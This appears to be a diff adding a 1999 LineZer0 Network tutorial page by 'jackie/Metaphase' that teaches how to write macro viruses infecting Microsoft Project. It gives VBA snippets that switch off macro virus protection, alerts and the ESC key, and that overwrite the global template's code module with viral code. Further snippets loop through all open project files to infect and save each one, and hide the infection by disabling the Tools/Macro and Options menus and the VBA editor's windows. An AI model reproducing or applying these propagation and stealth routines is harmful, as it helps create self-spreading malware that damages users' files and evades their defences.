@@ -1,0 +1,250 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - A Phreaky Macro Primer 0.1 - Project 98</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<blockquote>
+  <PRE><b>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=
+                                                      ?    ?    ?        
+                                                        ?  ____  
+                                                          /    \ ?
+      A phreaky macro primer v0.1                     ?  / \ _  \  ?
+      .by jackie / Metaphase                            ( .o o.  ) ___
+                                                      __/   ^    \/   \
+                                                     /  \___o____      \
+=-=[ Project 98 ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</b>
+
+     .Introduction to Project macros
+     .The 'Project' basics
+     .Infection hooks for Project
+     .Resisdent Project infection
+     .Stealth technics for Project
+                                
+   [ Music ]
+
+     .Earth Crisis .Destroy the machines
+     .The Faculty .Soundtrack
+
+<b>
+.Introduction to Project macros</b>
+
+On Oct 26, 1999  Data Fellows  first reported the birth  of a new infection
+platform. Someone wrote a piece of code that was able to infect the MS Pro-
+ject application. Corner,  it's name,  is a cross application macro between
+Word97 / 2K and Project98.  The only information about  this virus is taken
+from Data  Fellows virus information page.  I wanted to give you the source
+here, but it seems that only the  AV  community has the source.  If someone
+has it, please mail it to me!  Accourding to Data Fellow virus description,
+Corner (original name in virus code is 'Closer') infects Word in the common
+way, and is not resident in the template of Project98. It adds a blank pro-
+ject file  and infects it.  I think that all cross  infection is done  with
+ActiveX communication between the two applications.  Well to get on the our
+point, MS Project is a nice new infection platform. And oh, by the way, the
+first resisdent Project infector ever  was written by me for 29A #4,  wanna
+say hello to 29A now,  especially to Mr D.  MS Project has also a template,
+which we can infect and get resisdent.
+
+
+<b>.The 'Project' basics</b>
+
+    Well, Project is also part of the Office family, so the basic commands
+are kinda the same as in the other ones.
+
+	Application.EnableCancelKey = pjDisabled
+
+    First you have to know that  you can stop the execution of any macro by
+pressing ESC. So if the user does this, our macro will show errors and that
+is not good. Use this little command to disable the ESC key. So there is no
+bypass key anymore until you deactivate this option again.
+
+	Application.DisplayAlerts = False
+
+  This command turns off any alerts. If something not common happens really
+nothing will happen. This command will be active until you deactivate it.
+
+	Application.MacroVirusProtection = False
+
+    As you see, it is equal to Word, w here we had the possiblility to turn
+off the virus protection as easy as here in Project.  
+
+	Application.DisplayStatusBar = False
+
+To hide the status bar at the bottom of the window, that our user
+doesn't see when the book is saved or whatever.
+
+    Ok, now I made here a little sceme  which should show you how we infect
+Project.
+
+
+  .------------.       .------------.
+  |  Project   |       |  Template  |       A  document  infected  with our
+  .------------.  ---&gt; `------------´       macro and a  'clean'  template.
+  |   Macro    |                            Now  the  macro  stored  in the
+  `------------´                            document  trys  to  infect  the
+                                            template.  First  it  checks if
+                                            it is already  installed if not
+                                            install!
+
+  .------------.        .-----------.
+  |  Project   |        |  Template |       Our macro infected project  has
+  .------------.  ---&gt;  .-----------.       now infected the template. Both
+  |   Macro    |        |   Macro   |       contain now the virulant macro.
+  `------------´        `-----------´      
+
+    As you see, basic infection sceme everytime. For infection from the te-
+mplate to project file just replace the names, I am too tired to do a gfx.
+
+
+<b>.Infection hooks for Project</b>
+
+    Well, infection hooks should be clear for you, so let us take a look on
+the hooks which make some kind of sense for a macro in Project.
+
+    -Project_Activate
+     
+     Whenever our infected project book gets activated,  due change of win-
+dows, or opening, whatever.
+
+    -Project_Deactivate
+
+     This hook gets active when our infected project book is the active one
+and a new one gets opened, or selected, whatever.
+
+    -Project_Close
+
+     Like the name says,  when our project book gets closed, this hook does
+it's work.
+
+    -Project_Open
+
+     The same as close but only on opening a project book.
+
+
+.Resisdent Project Infection
+<b>
+ .Checking and Infecting template</b>
+
+    As I got this application  and heard that the first  macro of this kind
+is not resisdent in the template, my main goal was to make it resisdent. ;)
+So I took a seat,  looked at the whole help file and  found more sand in my
+pocket than help on  how to access this global template  in this help file.
+After starring hours and hours into the screen I got an idea and it worked!
+Due the cause that you can't access this global template as easy as in Word
+you have to use some tricks.
+
+    So first I took a look at the project window of the Visual Basic Editor
+looked and looked,  then some idea popped up in my mind: ' What if I access
+the project? ' This idea worked out as you can see below...
+
+    With Application.VBE.VBProjects(1).VBComponents(1).CodeModule
+
+    The first project  is always the global template project,  so we access
+this to get access to the class object 'ThisProject' of the global template
+You can also use ' ProjectGlobal ' instead of the '1' in VBProjects for the
+case that someone renames the VBA Project,  which seems where unlikely.  So
+it's a good decision to use the '1'.
+
+      If .Lines(1, 1) &lt;&gt; "'Project" Then
+
+Check if the first line isn't equal to our marker
+
+          .DeleteLines 1, .CountOfLines
+ 
+Delete all lines if the marker isn't right
+
+          .InsertLines 1, OurCode
+
+Insert our viral code then
+
+      End If
+     End With
+
+This works good. So here you have the code to make a resident macro bug for
+MS Project but remember, I did it first...hehe.
+
+
+<b>.Checking and infecting projects</b>
+
+    It is a good  idea infecting all open  project books at once.  So there
+are a few things you should look  out for but I will explain them.  It is a
+problem to save the infected book after infection,  cause you can only save
+the active project  file. So you need to activate it  before saving, other-
+wise all books will be saved under the same names.
+
+To infect all open projects just do a simple 'for/next' loop:
+
+    For x = 1 To Projects.Count
+
+Create a loop from one to the number of all opened project files
+
+     With Projects(x).VBProject.VBComponents(1).CodeModule
+      If .Lines(1, 1) &lt;&gt; "'Project" Then
+
+If the first line in the class object 'ThisProject' isn't equal to
+our marker, then
+
+          .DeleteLines 1, .CountOfLines
+
+delete all lines in the class
+
+          .InsertLines 1, OurCode
+
+and insert our viral code there.
+
+          Projects(x).Activate
+
+Activate the current infected project file to prepare everything
+for saving it.
+
+          FileSaveAs Projects(x).FullName
+
+Save the file under it's fullname.
+
+      End If
+    End With
+   Next
+
+Jump next file.
+
+We need to activate the project file, that it is saved under the right name
+otherwise all files will be saved under the name of the activated project.
+
+<b>
+.Stealth technics for Project</b>
+
+    Well, the stealth for Project is a small one, and as in every MS app we
+can disable some menus. The important for Project are:
+
+    CommandBars("Tools").Controls(9).Enabled = False
+    CommandBars("Tools").Controls(12).Enabled = False
+
+    Use this to have a bit of basic  stealth for your Project macro bug. It
+disables Tools/Macro and Tools/Options.
+
+    Another one would be to disable all windows and menus in the VBEditor.
+Use this one:
+
+    For y = 1 to VBE.Windows.Count
+     VBE.Windows(y).Visible = False
+    Next
+    VBE.CommandBars(1).Enabled = False
+    VBE.CommandBars(1).Enabled = False
+
+    This one is nice, use it ;)
+
+    Ok, now you know everything I know about MS Project infection, at least
+a bit ;-) The first virus that infected was Cross.Corner aka Closer written
+by Anti State Tortouse (Hi there!) and it was not resisdent, the first res-
+isdent one was written by me for the fourth issue of 29A zine,  so I am not
+able to include the source code with this version of the tutorial. Allright
+kids,  that is all I  have to say for this issue ... Now spotlight on Visio
+viruses.
+
+                               -End Of Part #6-
+
+<b>=-=[EOF]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=</b>
+</PRE>
+</blockquote>
+</BODY>
+</HTML>
